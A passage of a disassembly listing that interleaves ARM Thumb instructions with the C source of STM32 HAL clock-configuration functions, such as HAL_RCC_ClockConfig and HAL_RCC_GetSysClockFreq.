 8004206:	683a      	ldr	r2, [r7, #0]
 8004208:	429a      	cmp	r2, r3
 800420a:	d210      	bcs.n	800422e <HAL_RCC_ClockConfig+0x176>
  {
    /* Program the new number of wait states to the LATENCY bits in the FLASH_ACR register */
    __HAL_FLASH_SET_LATENCY(FLatency);
 800420c:	4b25      	ldr	r3, [pc, #148]	; (80042a4 <HAL_RCC_ClockConfig+0x1ec>)
 800420e:	681b      	ldr	r3, [r3, #0]
 8004210:	f023 0207 	bic.w	r2, r3, #7
 8004214:	4923      	ldr	r1, [pc, #140]	; (80042a4 <HAL_RCC_ClockConfig+0x1ec>)
 8004216:	683b      	ldr	r3, [r7, #0]
 8004218:	4313      	orrs	r3, r2
 800421a:	600b      	str	r3, [r1, #0]

    /* Check that the new number of wait states is taken into account to access the Flash
    memory by reading the FLASH_ACR register */
    if(__HAL_FLASH_GET_LATENCY() != FLatency)
 800421c:	4b21      	ldr	r3, [pc, #132]	; (80042a4 <HAL_RCC_ClockConfig+0x1ec>)
 800421e:	681b      	ldr	r3, [r3, #0]
 8004220:	f003 0307 	and.w	r3, r3, #7
 8004224:	683a      	ldr	r2, [r7, #0]
 8004226:	429a      	cmp	r2, r3
 8004228:	d001      	beq.n	800422e <HAL_RCC_ClockConfig+0x176>
    {
      return HAL_ERROR;
 800422a:	2301      	movs	r3, #1
 800422c:	e036      	b.n	800429c <HAL_RCC_ClockConfig+0x1e4>
    }
  }

  /*-------------------------- PCLK1 Configuration ---------------------------*/
  if(((RCC_ClkInitStruct->ClockType) & RCC_CLOCKTYPE_PCLK1) == RCC_CLOCKTYPE_PCLK1)
 800422e:	687b      	ldr	r3, [r7, #4]
 8004230:	681b      	ldr	r3, [r3, #0]
 8004232:	f003 0304 	and.w	r3, r3, #4
 8004236:	2b00      	cmp	r3, #0
 8004238:	d008      	beq.n	800424c <HAL_RCC_ClockConfig+0x194>
  {
    assert_param(IS_RCC_PCLK(RCC_ClkInitStruct->APB1CLKDivider));
    MODIFY_REG(RCC->CFGR, RCC_CFGR_PPRE1, RCC_ClkInitStruct->APB1CLKDivider);
 800423a:	4b1b      	ldr	r3, [pc, #108]	; (80042a8 <HAL_RCC_ClockConfig+0x1f0>)
 800423c:	689b      	ldr	r3, [r3, #8]
 800423e:	f423 62e0 	bic.w	r2, r3, #1792	; 0x700
 8004242:	687b      	ldr	r3, [r7, #4]
 8004244:	68db      	ldr	r3, [r3, #12]
 8004246:	4918      	ldr	r1, [pc, #96]	; (80042a8 <HAL_RCC_ClockConfig+0x1f0>)
 8004248:	4313      	orrs	r3, r2
 800424a:	608b      	str	r3, [r1, #8]
  }

  /*-------------------------- PCLK2 Configuration ---------------------------*/
  if(((RCC_ClkInitStruct->ClockType) & RCC_CLOCKTYPE_PCLK2) == RCC_CLOCKTYPE_PCLK2)
 800424c:	687b      	ldr	r3, [r7, #4]
 800424e:	681b      	ldr	r3, [r3, #0]
 8004250:	f003 0308 	and.w	r3, r3, #8
 8004254:	2b00      	cmp	r3, #0
 8004256:	d009      	beq.n	800426c <HAL_RCC_ClockConfig+0x1b4>
  {
    assert_param(IS_RCC_PCLK(RCC_ClkInitStruct->APB2CLKDivider));
    MODIFY_REG(RCC->CFGR, RCC_CFGR_PPRE2, ((RCC_ClkInitStruct->APB2CLKDivider) << 3U));
 8004258:	4b13      	ldr	r3, [pc, #76]	; (80042a8 <HAL_RCC_ClockConfig+0x1f0>)
 800425a:	689b      	ldr	r3, [r3, #8]
 800425c:	f423 5260 	bic.w	r2, r3, #14336	; 0x3800
 8004260:	687b      	ldr	r3, [r7, #4]
 8004262:	691b      	ldr	r3, [r3, #16]
 8004264:	00db      	lsls	r3, r3, #3
 8004266:	4910      	ldr	r1, [pc, #64]	; (80042a8 <HAL_RCC_ClockConfig+0x1f0>)
 8004268:	4313      	orrs	r3, r2
 800426a:	608b      	str	r3, [r1, #8]
  }

  /* Update the SystemCoreClock global variable */
  SystemCoreClock = HAL_RCC_GetSysClockFreq() >> (AHBPrescTable[READ_BIT(RCC->CFGR, RCC_CFGR_HPRE) >> RCC_CFGR_HPRE_Pos] & 0x1FU);
 800426c:	f000 f824 	bl	80042b8 <HAL_RCC_GetSysClockFreq>
 8004270:	4602      	mov	r2, r0
 8004272:	4b0d      	ldr	r3, [pc, #52]	; (80042a8 <HAL_RCC_ClockConfig+0x1f0>)
 8004274:	689b      	ldr	r3, [r3, #8]
 8004276:	091b      	lsrs	r3, r3, #4
 8004278:	f003 030f 	and.w	r3, r3, #15
 800427c:	490b      	ldr	r1, [pc, #44]	; (80042ac <HAL_RCC_ClockConfig+0x1f4>)
 800427e:	5ccb      	ldrb	r3, [r1, r3]
 8004280:	f003 031f 	and.w	r3, r3, #31
 8004284:	fa22 f303 	lsr.w	r3, r2, r3
 8004288:	4a09      	ldr	r2, [pc, #36]	; (80042b0 <HAL_RCC_ClockConfig+0x1f8>)
 800428a:	6013      	str	r3, [r2, #0]

  /* Configure the source of time base considering new system clocks settings*/
  status = HAL_InitTick(uwTickPrio);
 800428c:	4b09      	ldr	r3, [pc, #36]	; (80042b4 <HAL_RCC_ClockConfig+0x1fc>)
 800428e:	681b      	ldr	r3, [r3, #0]
 8004290:	4618      	mov	r0, r3
 8004292:	f7fc ff29 	bl	80010e8 <HAL_InitTick>
 8004296:	4603      	mov	r3, r0
 8004298:	72fb      	strb	r3, [r7, #11]

  return status;
 800429a:	7afb      	ldrb	r3, [r7, #11]
}
 800429c:	4618      	mov	r0, r3
 800429e:	3710      	adds	r7, #16
 80042a0:	46bd      	mov	sp, r7
 80042a2:	bd80      	pop	{r7, pc}
 80042a4:	40022000 	.word	0x40022000
 80042a8:	40021000 	.word	0x40021000
 80042ac:	0800d16c 	.word	0x0800d16c
 80042b0:	20000000 	.word	0x20000000
 80042b4:	20000004 	.word	0x20000004

080042b8 <HAL_RCC_GetSysClockFreq>:
  *
  *
  * @retval SYSCLK frequency
  */
uint32_t HAL_RCC_GetSysClockFreq(void)
{
 80042b8:	b480      	push	{r7}
 80042ba:	b089      	sub	sp, #36	; 0x24
 80042bc:	af00      	add	r7, sp, #0
  uint32_t msirange = 0U, sysclockfreq = 0U;
 80042be:	2300      	movs	r3, #0
 80042c0:	61fb      	str	r3, [r7, #28]
 80042c2:	2300      	movs	r3, #0
 80042c4:	61bb      	str	r3, [r7, #24]
  uint32_t pllvco, pllsource, pllr, pllm;    /* no init needed */
  uint32_t sysclk_source, pll_oscsource;

  sysclk_source = __HAL_RCC_GET_SYSCLK_SOURCE();
 80042c6:	4b3e      	ldr	r3, [pc, #248]	; (80043c0 <HAL_RCC_GetSysClockFreq+0x108>)
 80042c8:	689b      	ldr	r3, [r3, #8]
 80042ca:	f003 030c 	and.w	r3, r3, #12
 80042ce:	613b      	str	r3, [r7, #16]
  pll_oscsource = __HAL_RCC_GET_PLL_OSCSOURCE();
 80042d0:	4b3b      	ldr	r3, [pc, #236]	; (80043c0 <HAL_RCC_GetSysClockFreq+0x108>)
 80042d2:	68db      	ldr	r3, [r3, #12]
 80042d4:	f003 0303 	and.w	r3, r3, #3
 80042d8:	60fb      	str	r3, [r7, #12]

  if((sysclk_source == RCC_CFGR_SWS_MSI) ||
 80042da:	693b      	ldr	r3, [r7, #16]
 80042dc:	2b00      	cmp	r3, #0
 80042de:	d005      	beq.n	80042ec <HAL_RCC_GetSysClockFreq+0x34>
 80042e0:	693b      	ldr	r3, [r7, #16]
 80042e2:	2b0c      	cmp	r3, #12
 80042e4:	d121      	bne.n	800432a <HAL_RCC_GetSysClockFreq+0x72>
     ((sysclk_source == RCC_CFGR_SWS_PLL) && (pll_oscsource == RCC_PLLSOURCE_MSI)))
 80042e6:	68fb      	ldr	r3, [r7, #12]
 80042e8:	2b01      	cmp	r3, #1
 80042ea:	d11e      	bne.n	800432a <HAL_RCC_GetSysClockFreq+0x72>
  {
    /* MSI or PLL with MSI source used as system clock source */

    /* Get SYSCLK source */
    if(READ_BIT(RCC->CR, RCC_CR_MSIRGSEL) == 0U)
 80042ec:	4b34      	ldr	r3, [pc, #208]	; (80043c0 <HAL_RCC_GetSysClockFreq+0x108>)
 80042ee:	681b      	ldr	r3, [r3, #0]
 80042f0:	f003 0308 	and.w	r3, r3, #8
 80042f4:	2b00      	cmp	r3, #0
 80042f6:	d107      	bne.n	8004308 <HAL_RCC_GetSysClockFreq+0x50>
    { /* MSISRANGE from RCC_CSR applies */
      msirange = READ_BIT(RCC->CSR, RCC_CSR_MSISRANGE) >> RCC_CSR_MSISRANGE_Pos;
 80042f8:	4b31      	ldr	r3, [pc, #196]	; (80043c0 <HAL_RCC_GetSysClockFreq+0x108>)
 80042fa:	f8d3 3094 	ldr.w	r3, [r3, #148]	; 0x94
 80042fe:	0a1b      	lsrs	r3, r3, #8
 8004300:	f003 030f 	and.w	r3, r3, #15
 8004304:	61fb      	str	r3, [r7, #28]
 8004306:	e005      	b.n	8004314 <HAL_RCC_GetSysClockFreq+0x5c>
    }
    else
    { /* MSIRANGE from RCC_CR applies */
      msirange = READ_BIT(RCC->CR, RCC_CR_MSIRANGE) >> RCC_CR_MSIRANGE_Pos;
 8004308:	4b2d      	ldr	r3, [pc, #180]	; (80043c0 <HAL_RCC_GetSysClockFreq+0x108>)
 800430a:	681b      	ldr	r3, [r3, #0]
 800430c:	091b      	lsrs	r3, r3, #4
 800430e:	f003 030f 	and.w	r3, r3, #15
 8004312:	61fb      	str	r3, [r7, #28]
    }
    /*MSI frequency range in HZ*/
    msirange = MSIRangeTable[msirange];
 8004314:	4a2b      	ldr	r2, [pc, #172]	; (80043c4 <HAL_RCC_GetSysClockFreq+0x10c>)
 8004316:	69fb      	ldr	r3, [r7, #28]
 8004318:	f852 3023 	ldr.w	r3, [r2, r3, lsl #2]
 800431c:	61fb      	str	r3, [r7, #28]

    if(sysclk_source == RCC_CFGR_SWS_MSI)
 800431e:	693b      	ldr	r3, [r7, #16]
 8004320:	2b00      	cmp	r3, #0
 8004322:	d10d      	bne.n	8004340 <HAL_RCC_GetSysClockFreq+0x88>
    {
      /* MSI used as system clock source */
      sysclockfreq = msirange;
 8004324:	69fb      	ldr	r3, [r7, #28]
 8004326:	61bb      	str	r3, [r7, #24]
    if(sysclk_source == RCC_CFGR_SWS_MSI)
 8004328:	e00a      	b.n	8004340 <HAL_RCC_GetSysClockFreq+0x88>
    }
  }
  else if(sysclk_source == RCC_CFGR_SWS_HSI)
 800432a:	693b      	ldr	r3, [r7, #16]
 800432c:	2b04      	cmp	r3, #4
 800432e:	d102      	bne.n	8004336 <HAL_RCC_GetSysClockFreq+0x7e>
  {
    /* HSI used as system clock source */
    sysclockfreq = HSI_VALUE;
 8004330:	4b25      	ldr	r3, [pc, #148]	; (80043c8 <HAL_RCC_GetSysClockFreq+0x110>)
 8004332:	61bb      	str	r3, [r7, #24]
 8004334:	e004      	b.n	8004340 <HAL_RCC_GetSysClockFreq+0x88>
  }
  else if(sysclk_source == RCC_CFGR_SWS_HSE)
 8004336:	693b      	ldr	r3, [r7, #16]
 8004338:	2b08      	cmp	r3, #8
 800433a:	d101      	bne.n	8004340 <HAL_RCC_GetSysClockFreq+0x88>
  {
    /* HSE used as system clock source */
    sysclockfreq = HSE_VALUE;
 800433c:	4b23      	ldr	r3, [pc, #140]	; (80043cc <HAL_RCC_GetSysClockFreq+0x114>)
 800433e:	61bb      	str	r3, [r7, #24]
  else
  {
    /* unexpected case: sysclockfreq at 0 */
  }

  if(sysclk_source == RCC_CFGR_SWS_PLL)
 8004340:	693b      	ldr	r3, [r7, #16]
 8004342:	2b0c      	cmp	r3, #12
 8004344:	d134      	bne.n	80043b0 <HAL_RCC_GetSysClockFreq+0xf8>
    /* PLL used as system clock  source */

    /* PLL_VCO = (HSE_VALUE or HSI_VALUE or MSI_VALUE) * PLLN / PLLM
    SYSCLK = PLL_VCO / PLLR
    */
    pllsource = READ_BIT(RCC->PLLCFGR, RCC_PLLCFGR_PLLSRC);
 8004346:	4b1e      	ldr	r3, [pc, #120]	; (80043c0 <HAL_RCC_GetSysClockFreq+0x108>)
 8004348:	68db      	ldr	r3, [r3, #12]
 800434a:	f003 0303 	and.w	r3, r3, #3
 800434e:	60bb      	str	r3, [r7, #8]

    switch (pllsource)
 8004350:	68bb      	ldr	r3, [r7, #8]
 8004352:	2b02      	cmp	r3, #2
 8004354:	d003      	beq.n	800435e <HAL_RCC_GetSysClockFreq+0xa6>
 8004356:	68bb      	ldr	r3, [r7, #8]
 8004358:	2b03      	cmp	r3, #3
 800435a:	d003      	beq.n	8004364 <HAL_RCC_GetSysClockFreq+0xac>
 800435c:	e005      	b.n	800436a <HAL_RCC_GetSysClockFreq+0xb2>
    {
    case RCC_PLLSOURCE_HSI:  /* HSI used as PLL clock source */
      pllvco = HSI_VALUE;
 800435e:	4b1a      	ldr	r3, [pc, #104]	; (80043c8 <HAL_RCC_GetSysClockFreq+0x110>)
 8004360:	617b      	str	r3, [r7, #20]
      break;
 8004362:	e005      	b.n	8004370 <HAL_RCC_GetSysClockFreq+0xb8>

    case RCC_PLLSOURCE_HSE:  /* HSE used as PLL clock source */
      pllvco = HSE_VALUE;
 8004364:	4b19      	ldr	r3, [pc, #100]	; (80043cc <HAL_RCC_GetSysClockFreq+0x114>)
 8004366:	617b      	str	r3, [r7, #20]
      break;
 8004368:	e002      	b.n	8004370 <HAL_RCC_GetSysClockFreq+0xb8>

    case RCC_PLLSOURCE_MSI:  /* MSI used as PLL clock source */
    default:
      pllvco = msirange;
 800436a:	69fb      	ldr	r3, [r7, #28]
 800436c:	617b      	str	r3, [r7, #20]
      break;
 800436e:	bf00      	nop
    }
    pllm = (READ_BIT(RCC->PLLCFGR, RCC_PLLCFGR_PLLM) >> RCC_PLLCFGR_PLLM_Pos) + 1U ;
 8004370:	4b13      	ldr	r3, [pc, #76]	; (80043c0 <HAL_RCC_GetSysClockFreq+0x108>)
 8004372:	68db      	ldr	r3, [r3, #12]
 8004374:	091b      	lsrs	r3, r3, #4
 8004376:	f003 0307 	and.w	r3, r3, #7
 800437a:	3301      	adds	r3, #1
 800437c:	607b      	str	r3, [r7, #4]
    pllvco = (pllvco * (READ_BIT(RCC->PLLCFGR, RCC_PLLCFGR_PLLN) >> RCC_PLLCFGR_PLLN_Pos)) / pllm;
 800437e:	4b10      	ldr	r3, [pc, #64]	; (80043c0 <HAL_RCC_GetSysClockFreq+0x108>)
 8004380:	68db      	ldr	r3, [r3, #12]
 8004382:	0a1b      	lsrs	r3, r3, #8
 8004384:	f003 037f 	and.w	r3, r3, #127	; 0x7f
 8004388:	697a      	ldr	r2, [r7, #20]
 800438a:	fb03 f202 	mul.w	r2, r3, r2
 800438e:	687b      	ldr	r3, [r7, #4]
 8004390:	fbb2 f3f3 	udiv	r3, r2, r3
 8004394:	617b      	str	r3, [r7, #20]
    pllr = ((READ_BIT(RCC->PLLCFGR, RCC_PLLCFGR_PLLR) >> RCC_PLLCFGR_PLLR_Pos) + 1U ) * 2U;
 8004396:	4b0a      	ldr	r3, [pc, #40]	; (80043c0 <HAL_RCC_GetSysClockFreq+0x108>)
 8004398:	68db      	ldr	r3, [r3, #12]
 800439a:	0e5b      	lsrs	r3, r3, #25
 800439c:	f003 0303 	and.w	r3, r3, #3
 80043a0:	3301      	adds	r3, #1
 80043a2:	005b      	lsls	r3, r3, #1
 80043a4:	603b      	str	r3, [r7, #0]
    sysclockfreq = pllvco / pllr;
 80043a6:	697a      	ldr	r2, [r7, #20]
 80043a8:	683b      	ldr	r3, [r7, #0]
 80043aa:	fbb2 f3f3 	udiv	r3, r2, r3
 80043ae:	61bb      	str	r3, [r7, #24]
  }

  return sysclockfreq;
 80043b0:	69bb      	ldr	r3, [r7, #24]
}
 80043b2:	4618      	mov	r0, r3
 80043b4:	3724      	adds	r7, #36	; 0x24
 80043b6:	46bd      	mov	sp, r7
 80043b8:	f85d 7b04 	ldr.w	r7, [sp], #4
 80043bc:	4770      	bx	lr
 80043be:	bf00      	nop
 80043c0:	40021000 	.word	0x40021000
 80043c4:	0800d184 	.word	0x0800d184
 80043c8:	00f42400 	.word	0x00f42400
 80043cc:	007a1200 	.word	0x007a1200

080043d0 <HAL_RCC_GetHCLKFreq>:
  *
  * @note   The SystemCoreClock CMSIS variable is used to store System Clock Frequency.
  * @retval HCLK frequency in Hz
  */
uint32_t HAL_RCC_GetHCLKFreq(void)
{
 80043d0:	b480      	push	{r7}
 80043d2:	af00      	add	r7, sp, #0
  return SystemCoreClock;
 80043d4:	4b03      	ldr	r3, [pc, #12]	; (80043e4 <HAL_RCC_GetHCLKFreq+0x14>)
 80043d6:	681b      	ldr	r3, [r3, #0]
}
 80043d8:	4618      	mov	r0, r3
 80043da:	46bd      	mov	sp, r7
 80043dc:	f85d 7b04 	ldr.w	r7, [sp], #4
 80043e0:	4770      	bx	lr
 80043e2:	bf00      	nop
 80043e4:	20000000 	.word	0x20000000

080043e8 <HAL_RCC_GetPCLK1Freq>:
  * @note   Each time PCLK1 changes, this function must be called to update the
  *         right PCLK1 value. Otherwise, any configuration based on this function will be incorrect.
  * @retval PCLK1 frequency in Hz
  */
uint32_t HAL_RCC_GetPCLK1Freq(void)
{
 80043e8:	b580      	push	{r7, lr}
 80043ea:	af00      	add	r7, sp, #0
  /* Get HCLK source and Compute PCLK1 frequency ---------------------------*/
  return (HAL_RCC_GetHCLKFreq() >> (APBPrescTable[READ_BIT(RCC->CFGR, RCC_CFGR_PPRE1) >> RCC_CFGR_PPRE1_Pos] & 0x1FU));
 80043ec:	f7ff fff0 	bl	80043d0 <HAL_RCC_GetHCLKFreq>
 80043f0:	4602      	mov	r2, r0
 80043f2:	4b06      	ldr	r3, [pc, #24]	; (800440c <HAL_RCC_GetPCLK1Freq+0x24>)
 80043f4:	689b      	ldr	r3, [r3, #8]
 80043f6:	0a1b      	lsrs	r3, r3, #8
 80043f8:	f003 0307 	and.w	r3, r3, #7
 80043fc:	4904      	ldr	r1, [pc, #16]	; (8004410 <HAL_RCC_GetPCLK1Freq+0x28>)
 80043fe:	5ccb      	ldrb	r3, [r1, r3]
 8004400:	f003 031f 	and.w	r3, r3, #31
 8004404:	fa22 f303 	lsr.w	r3, r2, r3
}
 8004408:	4618      	mov	r0, r3
 800440a:	bd80      	pop	{r7, pc}
 800440c:	40021000 	.word	0x40021000
 8004410:	0800d17c 	.word	0x0800d17c

08004414 <HAL_RCC_GetPCLK2Freq>:
  * @note   Each time PCLK2 changes, this function must be called to update the
  *         right PCLK2 value. Otherwise, any configuration based on this function will be incorrect.
  * @retval PCLK2 frequency in Hz
  */
uint32_t HAL_RCC_GetPCLK2Freq(void)
{
 8004414:	b580      	push	{r7, lr}
 8004416:	af00      	add	r7, sp, #0
  /* Get HCLK source and Compute PCLK2 frequency ---------------------------*/
  return (HAL_RCC_GetHCLKFreq()>> (APBPrescTable[READ_BIT(RCC->CFGR, RCC_CFGR_PPRE2) >> RCC_CFGR_PPRE2_Pos] & 0x1FU));
 8004418:	f7ff ffda 	bl	80043d0 <HAL_RCC_GetHCLKFreq>
 800441c:	4602      	mov	r2, r0
 800441e:	4b06      	ldr	r3, [pc, #24]	; (8004438 <HAL_RCC_GetPCLK2Freq+0x24>)
 8004420:	689b      	ldr	r3, [r3, #8]
 8004422:	0adb      	lsrs	r3, r3, #11
 8004424:	f003 0307 	and.w	r3, r3, #7
 8004428:	4904      	ldr	r1, [pc, #16]	; (800443c <HAL_RCC_GetPCLK2Freq+0x28>)
 800442a:	5ccb      	ldrb	r3, [r1, r3]
 800442c:	f003 031f 	and.w	r3, r3, #31
 8004430:	fa22 f303 	lsr.w	r3, r2, r3
}
 8004434:	4618      	mov	r0, r3
 8004436:	bd80      	pop	{r7, pc}
 8004438:	40021000 	.word	0x40021000
 800443c:	0800d17c 	.word	0x0800d17c

08004440 <RCC_SetFlashLatencyFromMSIRange>:
            voltage range.
  * @param  msirange  MSI range value from RCC_MSIRANGE_0 to RCC_MSIRANGE_11
  * @retval HAL status
  */
static HAL_StatusTypeDef RCC_SetFlashLatencyFromMSIRange(uint32_t msirange)
{
 8004440:	b580      	push	{r7, lr}
 8004442:	b086      	sub	sp, #24
 8004444:	af00      	add	r7, sp, #0
 8004446:	6078      	str	r0, [r7, #4]
  uint32_t vos;
  uint32_t latency = FLASH_LATENCY_0;  /* default value 0WS */
 8004448:	2300      	movs	r3, #0
 800444a:	613b      	str	r3, [r7, #16]

  if(__HAL_RCC_PWR_IS_CLK_ENABLED())
 800444c:	4b2a      	ldr	r3, [pc, #168]	; (80044f8 <RCC_SetFlashLatencyFromMSIRange+0xb8>)
 800444e:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 8004450:	f003 5380 	and.w	r3, r3, #268435456	; 0x10000000
 8004454:	2b00      	cmp	r3, #0
 8004456:	d003      	beq.n	8004460 <RCC_SetFlashLatencyFromMSIRange+0x20>
  {
    vos = HAL_PWREx_GetVoltageRange();
 8004458:	f7ff f9a6 	bl	80037a8 <HAL_PWREx_GetVoltageRange>
 800445c:	6178      	str	r0, [r7, #20]
 800445e:	e014      	b.n	800448a <RCC_SetFlashLatencyFromMSIRange+0x4a>
  }
  else
  {
    __HAL_RCC_PWR_CLK_ENABLE();
 8004460:	4b25      	ldr	r3, [pc, #148]	; (80044f8 <RCC_SetFlashLatencyFromMSIRange+0xb8>)
 8004462:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 8004464:	4a24      	ldr	r2, [pc, #144]	; (80044f8 <RCC_SetFlashLatencyFromMSIRange+0xb8>)
 8004466:	f043 5380 	orr.w	r3, r3, #268435456	; 0x10000000
 800446a:	6593      	str	r3, [r2, #88]	; 0x58
 800446c:	4b22      	ldr	r3, [pc, #136]	; (80044f8 <RCC_SetFlashLatencyFromMSIRange+0xb8>)
 800446e:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 8004470:	f003 5380 	and.w	r3, r3, #268435456	; 0x10000000
 8004474:	60fb      	str	r3, [r7, #12]
 8004476:	68fb      	ldr	r3, [r7, #12]
    vos = HAL_PWREx_GetVoltageRange();
 8004478:	f7ff f996 	bl	80037a8 <HAL_PWREx_GetVoltageRange>
 800447c:	6178      	str	r0, [r7, #20]
    __HAL_RCC_PWR_CLK_DISABLE();
 800447e:	4b1e      	ldr	r3, [pc, #120]	; (80044f8 <RCC_SetFlashLatencyFromMSIRange+0xb8>)
 8004480:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 8004482:	4a1d      	ldr	r2, [pc, #116]	; (80044f8 <RCC_SetFlashLatencyFromMSIRange+0xb8>)
 8004484:	f023 5380 	bic.w	r3, r3, #268435456	; 0x10000000
 8004488:	6593      	str	r3, [r2, #88]	; 0x58
  }

  if(vos == PWR_REGULATOR_VOLTAGE_SCALE1)
 800448a:	697b      	ldr	r3, [r7, #20]
 800448c:	f5b3 7f00 	cmp.w	r3, #512	; 0x200
 8004490:	d10b      	bne.n	80044aa <RCC_SetFlashLatencyFromMSIRange+0x6a>
  {
    if(msirange > RCC_MSIRANGE_8)
 8004492:	687b      	ldr	r3, [r7, #4]
 8004494:	2b80      	cmp	r3, #128	; 0x80
 8004496:	d919      	bls.n	80044cc <RCC_SetFlashLatencyFromMSIRange+0x8c>
    {
      /* MSI > 16Mhz */
      if(msirange > RCC_MSIRANGE_10)
 8004498:	687b      	ldr	r3, [r7, #4]
 800449a:	2ba0      	cmp	r3, #160	; 0xa0
 800449c:	d902      	bls.n	80044a4 <RCC_SetFlashLatencyFromMSIRange+0x64>
      {
        /* MSI 48Mhz */
        latency = FLASH_LATENCY_2; /* 2WS */
 800449e:	2302      	movs	r3, #2
 80044a0:	613b      	str	r3, [r7, #16]
 80044a2:	e013      	b.n	80044cc <RCC_SetFlashLatencyFromMSIRange+0x8c>
      }
      else
      {
        /* MSI 24Mhz or 32Mhz */
        latency = FLASH_LATENCY_1; /* 1WS */
 80044a4:	2301      	movs	r3, #1
 80044a6:	613b      	str	r3, [r7, #16]
 80044a8:	e010      	b.n	80044cc <RCC_SetFlashLatencyFromMSIRange+0x8c>
        latency = FLASH_LATENCY_1; /* 1WS */
      }
      /* else MSI < 8Mhz default FLASH_LATENCY_0 0WS */
    }
#else
    if(msirange > RCC_MSIRANGE_8)
 80044aa:	687b      	ldr	r3, [r7, #4]
 80044ac:	2b80      	cmp	r3, #128	; 0x80
 80044ae:	d902      	bls.n	80044b6 <RCC_SetFlashLatencyFromMSIRange+0x76>
    {
      /* MSI > 16Mhz */
      latency = FLASH_LATENCY_3; /* 3WS */
 80044b0:	2303      	movs	r3, #3
 80044b2:	613b      	str	r3, [r7, #16]
 80044b4:	e00a      	b.n	80044cc <RCC_SetFlashLatencyFromMSIRange+0x8c>
    }
    else
    {
      if(msirange == RCC_MSIRANGE_8)
 80044b6:	687b      	ldr	r3, [r7, #4]
 80044b8:	2b80      	cmp	r3, #128	; 0x80
 80044ba:	d102      	bne.n	80044c2 <RCC_SetFlashLatencyFromMSIRange+0x82>
      {
        /* MSI 16Mhz */
        latency = FLASH_LATENCY_2; /* 2WS */
 80044bc:	2302      	movs	r3, #2
 80044be:	613b      	str	r3, [r7, #16]
 80044c0:	e004      	b.n	80044cc <RCC_SetFlashLatencyFromMSIRange+0x8c>
      }
      else if(msirange == RCC_MSIRANGE_7)
 80044c2:	687b      	ldr	r3, [r7, #4]
 80044c4:	2b70      	cmp	r3, #112	; 0x70
 80044c6:	d101      	bne.n	80044cc <RCC_SetFlashLatencyFromMSIRange+0x8c>
      {
        /* MSI 8Mhz */
        latency = FLASH_LATENCY_1; /* 1WS */
 80044c8:	2301      	movs	r3, #1
 80044ca:	613b      	str	r3, [r7, #16]
      /* else MSI < 8Mhz default FLASH_LATENCY_0 0WS */
    }
#endif
  }

  __HAL_FLASH_SET_LATENCY(latency);
 80044cc:	4b0b      	ldr	r3, [pc, #44]	; (80044fc <RCC_SetFlashLatencyFromMSIRange+0xbc>)
 80044ce:	681b      	ldr	r3, [r3, #0]
 80044d0:	f023 0207 	bic.w	r2, r3, #7
 80044d4:	4909      	ldr	r1, [pc, #36]	; (80044fc <RCC_SetFlashLatencyFromMSIRange+0xbc>)
 80044d6:	693b      	ldr	r3, [r7, #16]
 80044d8:	4313      	orrs	r3, r2
 80044da:	600b      	str	r3, [r1, #0]

  /* Check that the new number of wait states is taken into account to access the Flash
     memory by reading the FLASH_ACR register */
  if(__HAL_FLASH_GET_LATENCY() != latency)
 80044dc:	4b07      	ldr	r3, [pc, #28]	; (80044fc <RCC_SetFlashLatencyFromMSIRange+0xbc>)
 80044de:	681b      	ldr	r3, [r3, #0]
 80044e0:	f003 0307 	and.w	r3, r3, #7
 80044e4:	693a      	ldr	r2, [r7, #16]
 80044e6:	429a      	cmp	r2, r3
 80044e8:	d001      	beq.n	80044ee <RCC_SetFlashLatencyFromMSIRange+0xae>
  {
    return HAL_ERROR;
 80044ea:	2301      	movs	r3, #1
 80044ec:	e000      	b.n	80044f0 <RCC_SetFlashLatencyFromMSIRange+0xb0>
  }

  return HAL_OK;
 80044ee:	2300      	movs	r3, #0
}
 80044f0:	4618      	mov	r0, r3
 80044f2:	3718      	adds	r7, #24
 80044f4:	46bd      	mov	sp, r7
 80044f6:	bd80      	pop	{r7, pc}
 80044f8:	40021000 	.word	0x40021000
 80044fc:	40022000 	.word	0x40022000

08004500 <HAL_RCCEx_PeriphCLKConfig>:
  *         the RTC clock source: in this case the access to Backup domain is enabled.
  *
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_RCCEx_PeriphCLKConfig(RCC_PeriphCLKInitTypeDef  *PeriphClkInit)
{
 8004500:	b580      	push	{r7, lr}
 8004502:	b086      	sub	sp, #24
 8004504:	af00      	add	r7, sp, #0
 8004506:	6078      	str	r0, [r7, #4]
  uint32_t tmpregister, tickstart;     /* no init needed */
  HAL_StatusTypeDef ret = HAL_OK;      /* Intermediate status */
 8004508:	2300      	movs	r3, #0
 800450a:	74fb      	strb	r3, [r7, #19]
  HAL_StatusTypeDef status = HAL_OK;   /* Final status */
 800450c:	2300      	movs	r3, #0
 800450e:	74bb      	strb	r3, [r7, #18]
  assert_param(IS_RCC_PERIPHCLOCK(PeriphClkInit->PeriphClockSelection));

#if defined(SAI1)

  /*-------------------------- SAI1 clock source configuration ---------------------*/
  if((((PeriphClkInit->PeriphClockSelection) & RCC_PERIPHCLK_SAI1) == RCC_PERIPHCLK_SAI1))
 8004510:	687b      	ldr	r3, [r7, #4]
 8004512:	681b      	ldr	r3, [r3, #0]
 8004514:	f403 6300 	and.w	r3, r3, #2048	; 0x800
 8004518:	2b00      	cmp	r3, #0
 800451a:	d031      	beq.n	8004580 <HAL_RCCEx_PeriphCLKConfig+0x80>
  {
    /* Check the parameters */
    assert_param(IS_RCC_SAI1CLK(PeriphClkInit->Sai1ClockSelection));

    switch(PeriphClkInit->Sai1ClockSelection)
 800451c:	687b      	ldr	r3, [r7, #4]
 800451e:	6bdb      	ldr	r3, [r3, #60]	; 0x3c
 8004520:	f5b3 0f40 	cmp.w	r3, #12582912	; 0xc00000
 8004524:	d01a      	beq.n	800455c <HAL_RCCEx_PeriphCLKConfig+0x5c>
 8004526:	f5b3 0f40 	cmp.w	r3, #12582912	; 0xc00000
 800452a:	d814      	bhi.n	8004556 <HAL_RCCEx_PeriphCLKConfig+0x56>
 800452c:	2b00      	cmp	r3, #0
 800452e:	d009      	beq.n	8004544 <HAL_RCCEx_PeriphCLKConfig+0x44>
 8004530:	f5b3 0f00 	cmp.w	r3, #8388608	; 0x800000
 8004534:	d10f      	bne.n	8004556 <HAL_RCCEx_PeriphCLKConfig+0x56>
    case RCC_SAI1CLKSOURCE_PLL:      /* PLL is used as clock source for SAI1*/
      /* Enable SAI Clock output generated from System PLL . */
#if defined(RCC_PLLSAI2_SUPPORT)
